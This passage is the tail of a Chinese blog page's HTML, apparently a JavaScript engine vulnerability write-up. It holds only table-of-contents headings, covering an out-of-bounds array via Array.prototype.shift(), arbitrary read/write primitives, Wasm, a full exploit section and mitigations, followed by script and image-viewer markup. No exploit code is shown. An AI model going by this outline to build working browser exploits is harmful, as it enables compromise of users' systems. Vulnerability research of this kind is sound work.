href="#%E9%80%9A%E8%BF%87-Array-prototype-shift-%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AA%E9%95%BF%E5%BA%A6%E4%B8%BA0xffffffff%E7%9A%84%E8%B6%8A%E7%95%8C%E6%95%B0%E7%BB%84"><span class="toc-number">3.4.2.2.</span> <span class="toc-text">通过 Array.prototype.shift() 获得一个长度为0xffffffff的越界数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%B6%8A%E7%95%8C%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%E5%8E%9F%E8%AF%AD"><span class="toc-number">3.4.2.3.</span> <span class="toc-text">通过越界数组构造任意地址读写原语</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Wasm"><span class="toc-number">3.4.2.4.</span> <span class="toc-text">Wasm</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">3.4.3.</span> <span class="toc-text">完整exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">4.</span> <span class="toc-text">四、缓解措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">5.</span> <span class="toc-text">五、参考文献</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
</body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
